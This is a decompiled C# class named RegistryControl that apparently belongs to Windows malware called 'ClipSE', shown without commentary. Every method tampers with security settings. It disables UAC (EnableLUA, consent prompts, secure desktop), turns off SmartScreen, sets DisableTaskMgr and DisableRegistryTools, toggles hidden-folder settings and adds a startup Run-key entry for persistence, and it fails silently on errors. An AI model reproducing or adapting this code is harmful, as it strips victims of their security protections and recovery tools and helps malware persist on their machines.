using System;
using Microsoft.Win32;

namespace ClipSE
{
	// Token: 0x02000009 RID: 9
	public static class RegistryControl
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000010 RID: 16 RVA: 0x00002738 File Offset: 0x00000938
		public static RegistryView Regview
		{
			get
			{
				if (RunCheck.StartWin_xSixtyFour())
				{
					return RegistryView.Registry64;
				}
				return RegistryView.Registry32;
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x0000274C File Offset: 0x0000094C
		public static bool ToogleHidingFolders(string regpath, string value, int locker)
		{
			bool result;
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(regpath, true))
				{
					try
					{
						registryKey.SetValue(value, locker, RegistryValueKind.DWord);
						result = true;
					}
					catch
					{
						result = false;
					}
				}
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000027B8 File Offset: 0x000009B8
		public static bool ToogleUacAdmin(string regpath, int locker)
		{
			bool result;
			try
			{
				if (RunCheck.IsUserAdministrator())
				{
					using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryControl.Regview))
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(regpath, RunCheck.StartWin_xSixtyFour()))
						{
							try
							{
								foreach (string name in RegistryControl.FieldsLocal)
								{
									try
									{
										registryKey2.SetValue(name, locker, RegistryValueKind.DWord);
									}
									catch
									{
									}
								}
							}
							catch (Exception)
							{
								return false;
							}
							return true;
						}
					}
				}
				result = true;
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002888 File Offset: 0x00000A88
		public static bool ToogleTaskMandRegedit(string regpath, int locker)
		{
			bool result;
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(regpath, RunCheck.StartWin_xSixtyFour()))
				{
					using (RegistryKey registryKey2 = registryKey.CreateSubKey("System"))
					{
						registryKey2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
						registryKey2.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
						try
						{
							foreach (string name in RegistryControl.FiledsSystem)
							{
								try
								{
									registryKey2.SetValue(name, locker);
								}
								catch
								{
								}
							}
						}
						catch (Exception)
						{
							return false;
						}
						result = true;
					}
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002970 File Offset: 0x00000B70
		public static bool ToogleSmartScreen(string regpath, string name, string enable)
		{
			bool result;
			try
			{
				if (RunCheck.IsUserAdministrator())
				{
					using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryControl.Regview))
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(regpath, RunCheck.StartWin_xSixtyFour()))
						{
							try
							{
								registryKey2.SetValue(name, enable, RegistryValueKind.String);
								return true;
							}
							catch
							{
								return false;
							}
						}
					}
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002A08 File Offset: 0x00000C08
		public static void RegStartupInizialize(bool status, string regpath, string name, string localpath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(regpath, true))
				{
					if (!status)
					{
						try
						{
							registryKey.DeleteValue(name);
							goto IL_2A;
						}
						catch (Exception)
						{
							goto IL_2A;
						}
					}
					try
					{
						registryKey.SetValue(name, localpath, RegistryValueKind.String);
					}
					catch (Exception)
					{
					}
					IL_2A:;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000019 RID: 25
		private static readonly string[] FieldsLocal = new string[]
		{
			"EnableLUA",
			"EnableInstallerDetection",
			"PromptOnSecureDesktop",
			"ConsentPromptBehaviorAdmin",
			"ConsentPromptBehaviorUser",
			"EnableSecureUIAPaths",
			"ValidateAdminCodeSignatures",
			"EnableSmartScreen",
			"EnableVirtualization",
			"EnableUIADesktopToggle",
			"FilterAdministratorToken"
		};

		// Token: 0x0400001A RID: 26
		private static readonly string[] FiledsSystem = new string[]
		{
			"ConsentPromptBehaviorAdmin",
			"DisableRegistryTools",
			"DisableTaskMgr"
		};
	}
}
